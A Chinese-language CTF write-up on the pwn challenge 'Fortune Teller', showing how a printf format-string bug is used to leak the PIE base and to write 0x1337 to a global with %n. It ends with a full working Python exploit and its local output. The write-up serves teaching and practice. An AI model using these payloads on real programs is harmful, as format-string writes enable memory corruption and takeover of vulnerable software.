---
title: "Fortune Teller — 格式化字符串写全局变量拿 flag (FortID CTF)"
description: FortID CTF pwn 题：printf 格式化字符串漏洞，泄漏 PIE base 后用 %n 把全局变量改成 0x1337 触发 win()
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Pwn ｜ 赛事：FortID CTF 2026 ｜ 关键词：Format String、%n 任意写、PIE 泄漏
>
> 保护：Full RELRO / Canary / NX / PIE（全开）

## 题目背景

一个"算命"服务，菜单三个选项：

1. **Ask the oracle**（向神谕提问）
2. **Receive blessing**（接受祝福）
3. Leave

给了源码 `chall.c` 和二进制 `fortune`。最关键的两段：

```c
volatile unsigned int blessing = 0;

static void win(void) {            // 读 flag.txt 打印出来
    char flag[128];
    FILE *f = fopen("flag.txt", "r");
    fgets(flag, sizeof(flag), f);
    puts(flag);
}

static void ask_oracle(void) {
    char question[256];
    read_line(question, sizeof(question));
    puts("The oracle speaks:");
    printf(question);              // <--- 漏洞在这
    putchar('\n');
}

static void receive_blessing(void) {
    if (blessing == 0x1337) {      // 只有全局 blessing == 0x1337 才会
        win();                     // 调用 win() 打印 flag
    } else {
        printf("You are not blessed yet. Current blessing: 0x%x\n", blessing);
    }
}
```

目标非常明确：把全局变量 `blessing` 从 `0` 改成 `0x1337`，然后选 2 就能让 `win()` 打印 flag。

## 关键漏洞：printf(question)

`printf(question)` 把**用户输入直接当成格式化字符串**——这是教科书级别的**格式化字符串漏洞（Format String）**。只要我在提问里塞 `%p`、`%x`、`%n` 这些格式符，`printf` 就会老老实实去解析：

- `%p` / `%x`：把栈上对应位置的值当指针/整数**泄漏**出来（读）；
- `%n`：把"到目前为止已经打印的字符数"**写进**一个指针指向的地址（写）。

有读有写，而且题目又直接给了一个只要满足 `blessing == 0x1337` 就打印 flag 的后门。那么路线就是：**用 `%n` 把 `0x1337` 写到 `&blessing`**。

但是保护全开——尤其是 **PIE**，意味着 `blessing` 的真实地址每次运行都不一样，我得先**泄漏出程序基址（PIE base）**才能算出 `&blessing`。好在格式化字符串漏洞天生读写双全，泄漏这步同样靠它。

## 第一步：找到我的输入在栈上的偏移

先摸清 `printf` 的第几个"参数位置"对应我自己的输入缓冲区。发一串标记 + 一堆 `%p`：

```
AABBCCDD.%1$p.%2$p.%3$p. ... .%30$p
```

回显里第 6 个位置正是 `0x4444434342424141`——小端序的 `AABBCCDD`。所以 **我的缓冲区从格式化参数偏移 6 开始**。这个 6 等下写地址时要用。

## 第二步：泄漏 PIE base

继续往更深的栈位置探，找一个指向程序自身代码段的指针（而不是 libc 的）。在偏移 **49** 处稳定地拿到一个形如 `0x5xxxxxxxx570` 的地址——低位 `0x570` 正好对应 `main` 的偏移 `0x1570`（它是 `__libc_start_main` 启动时压在栈上的 `main` 函数地址）。于是：

```
base = leak(%49$p) - 0x1570
```

减完末尾是 `000`，确认对齐无误。再用 `nm` 拿到 `blessing` 的静态偏移：

```
$ nm fortune | grep -E "blessing|win"
000000000000404c B blessing
00000000000012a9 t win

&blessing = base + 0x404c
```

**注意：泄漏和写入必须在同一个进程里完成**，因为 ASLR 让每次运行的 base 都不同。好在菜单是个 `while(1)` 循环、`blessing` 又是全局变量，所以我可以：第一次选 1 泄漏 → 第二次选 1 写入 → 第三次选 2 收 flag，全程一个连接。

## 第三步：用 %n 写 0x1337

`0x1337 = 4919`。思路是让 `printf` 先打印 4919 个字符，再用 `%n` 把这个计数（4919）写进 `&blessing`。

要让 `%n` 写到 `&blessing`，得把这个地址**放到栈上能被 `%N$n` 引用的位置**——也就是放进我自己的输入缓冲区。做法是经典的"**先放格式符、补齐到 8 字节对齐、再接地址**"：

```
payload = b"%4919c%8$n"          # 打印 4919 个字符，然后写
payload = payload.ljust(16, b"a") # 补到 16 字节 => 地址落在缓冲区第 2 个 qword
payload += p64(&blessing)         # 缓冲区偏移 6 + 2 = 参数偏移 8，所以上面用 %8$n
```

- `%4919c`：输出 4919 个字符，让 `%n` 的计数等于 `0x1337`；
- 把格式符部分补齐到 **16 字节**，这样后面接的 8 字节地址正好落在缓冲区的第 2 个 qword；
- 缓冲区从参数偏移 6 起，第 2 个 qword 就是偏移 **8**，所以写 `%8$n`——自洽。

> 小坑：地址 `&blessing` 的高 2 字节是 `0x0000`，含空字节。但本题 `read_line` 是逐字节读、只在遇到 `\n` 才停（不因 `\0` 截断），所以地址放在 payload **末尾**没问题——`%n` 的格式符在空字节**之前**就已经被解析执行了。

## 完整 EXP（本地实测可用）

```python
import subprocess, struct, re, time, os, select
def p64(x): return struct.pack("<Q", x)

BLESSING_OFF, MAIN_OFF, LEAK_ARG = 0x404c, 0x1570, 49

p = subprocess.Popen(["./fortune"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, bufsize=0)
def read_until(tok, t=5):
    buf=b""; end=time.time()+t
    while tok not in buf and time.time()<end:
        r,_,_=select.select([p.stdout],[],[],0.3)
        if r: buf+=os.read(p.stdout.fileno(),4096)
    return buf
def send(b): p.stdin.write(b); p.stdin.flush()

# 1) 泄漏 PIE base
read_until(b"> "); send(b"1\n"); read_until(b"Ask the oracle")
send(b"LEAK:%49$p\n")
out = read_until(b"\n") + read_until(b"1. Ask")
leak = int(re.search(rb"LEAK:(0x[0-9a-f]+)", out).group(1), 16)
base = leak - MAIN_OFF
blessing = base + BLESSING_OFF
print("[+] base =", hex(base), " &blessing =", hex(blessing))

# 2) 写 blessing = 0x1337
fmt = b"%4919c%8$n".ljust(16, b"a") + p64(blessing)
send(b"1\n"); read_until(b"Ask the oracle"); send(fmt + b"\n"); read_until(b"1. Ask")

# 3) 收 flag
send(b"2\n")
final = read_until(b"3. Leave") + read_until(b"\n")
print(re.search(rb"FortID\{[^}]*\}", final).group(0).decode())
```

本地放一个假的 `flag.txt` 跑一遍，输出：

```
[+] base = 0x583fd3b75000  &blessing = 0x583fd3b7904c
The stars are aligned.
FortID{test_local_flag_123}
```

打远程时把 `subprocess.Popen` 换成到题目实例的 socket 连接即可，逻辑完全一样。

## 小结 / 收获

- **`printf(用户输入)` 永远是红线**。只要格式化字符串可控，就同时拥有了"任意读"（`%p`/`%x` 泄漏）和"任意写"（`%n`），保护开再多也挡不住逻辑后门。
- **PIE 下先泄漏再利用**。全局变量地址随基址浮动，必须先用同一个漏洞泄漏出一个指向代码段的指针反推 base，而且**泄漏与写入要在同一次连接内**，否则 ASLR 让你算的地址作废。
- **`%n` 写地址的套路是固定的**：格式符在前、补齐到对齐边界、目标地址放末尾，用 `%偏移$n` 精确引用。先用 `%p` 串定位自己缓冲区的参数偏移，是这类题的第一步基本功。
- 这题甚至不用改返回地址、不用管 canary——有现成的 `win()`，只要改一个全局整数。读懂源码、看清"赢的条件"，往往比盲目构造 ROP 更快。
